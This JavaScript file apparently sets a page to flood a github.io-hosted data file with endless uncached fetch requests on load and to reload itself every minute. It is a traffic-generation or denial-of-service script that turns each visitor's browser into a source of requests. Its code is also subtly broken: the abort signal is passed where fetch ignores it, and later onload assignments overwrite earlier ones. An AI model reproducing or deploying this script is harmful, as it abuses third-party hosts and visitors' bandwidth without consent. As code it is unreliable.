// Set delay to ms
function delay(milliseconds){
    return new Promise(resolve => {
      setTimeout(resolve, milliseconds);
    });
}

window.onload = async function startdownV2(){
    const controller = new AbortController()
  
    // 10 second timeout:
  
    const timeoutId = setTimeout(() => controller.abort(), 10000)
    while(true){
      //await delay(10);
      await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
      // completed request before timeout fired
  
      // If you only wanted to timeout the request, not the response, add:
      // clearTimeout(timeoutId)
      })
    }
}
  /*window.onload = async function startdown(){
    while(true) {
      //await delay(10);
      await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
    }
  }*/

window.onload = async function reload(){
    await delay(60000);
    location.reload();
}